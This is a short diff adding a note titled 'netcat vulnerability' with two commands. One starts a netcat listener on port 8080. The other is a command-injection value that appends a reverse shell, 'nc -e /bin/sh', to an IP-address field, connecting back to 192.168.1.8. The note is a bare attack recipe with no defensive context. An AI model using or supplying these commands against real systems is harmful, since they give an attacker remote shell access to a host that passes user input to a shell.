@@ -1,0 +1,12 @@
+##netcat vulnerability
+
+  ##netcat listener....
+  nc -vv -l -p 8080
+  
+ 
+ 
+ 
+ #netcat execuating....code
+ 
+  
+ip_address; nc -e /bin/sh 192.168.1.8 8080
